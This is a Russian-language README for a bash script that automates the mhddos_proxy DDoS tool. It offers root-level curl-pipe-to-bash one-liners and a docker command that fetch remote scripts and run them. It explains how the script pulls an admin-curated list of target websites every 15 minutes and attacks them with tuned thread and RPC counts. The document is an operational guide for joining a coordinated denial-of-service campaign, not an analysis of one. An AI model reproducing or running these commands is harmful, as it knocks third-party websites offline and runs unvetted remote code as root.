# auto_mhddos - bash скрипт автоматизирующий [mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy)

## Docker

```shell
docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest [num_of_copies] [threads] [rpc]
```

Все параметры опциональные, но если передаются, то строго в указанном порядке.

## Bash

Перед запуском перейти под пользователя root. Для этого выполнить команду `sudo su`

### Установка или получение обновлений

* Выполняем команду `curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/setup.sh | bash`

* Скрипт автоматически устанавливает git, python3, pip, mhddos_proxy, MHDDoS и все зависимости.

### Запуск скрипта

* Запускается одной командой (one-liner) в Linux і WSL (Windows Subsystem for Linux). Дальнейшее вмешательство со стороны пользователя не обязательно. `curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash`

#
Команды для разного железа: 

-- Слабое (2 ядра 2 ГБ): `curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 1 500 100`

-- Среднее: `curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 2 1000 200`

-- Быстрое: `curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 2 2000 1000`

Значение параметров на примере "bash -s -- 1 500 100":

1 - кол-во паралельно запущенных копий mhddos_proxy.

500 - количество потоков (threads). Параметр -t в mhddos_proxy.

100 - параметр --rpc в mhddos_proxy.
#

* Работает с курируемым админами единым списком [сайтов-целей](https://github.com/Aruiem234/auto_mhddos/blob/main/runner_targets).

* База целей обновляется скриптом каждые 15 мин.

* Если целей много, то они выбираются из списка рандомно, поэтому не обязательно раскидывать пользователей по группам и распределять между ними нагрузку. Рандом все сделает самостоятельно.

* По умолчанию скрипт запускает 1 копию mhddos_proxy. Если запустить больше, то каждая копия будет независимо выбирает цель из списка, повторяться они не будут. Для этого в списке должны быть хотя бы две цели. Если будет мало целей, лишние копии программы просто не будут запускаться.

* Чтобы скрипт запускал больше копий mhddos_proxy, например 3, выполнить следующую команду `curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/runner.sh | bash -s -- 3` Если в списке всего две цели (две команды, начинающиеся на "runner.py"), то запускать 3 копии нет смысла. Вреда правда тоже не будет. Скрипт возьмет две цели, а третью копию программы просто не запустит.

Теоретически все это позволяет запустить скрипт на ПК/vps и всю остальную работу (обновление, перезапуск) он будет делать самостоятельно.

Рекомендуется использовать на Ubuntu 20.04. Вероятно будет работать на всех Ubuntu начиная с 18.04, а также всех производных Ubuntu и WSL2.

### Завершение скрипта

Чтобы завершить скрипт, простой закройте окно с терминалом

ИЛИ

В другом терминале выполните команду "pkill python3", потом в основном терминале нажмите CTRL + C.
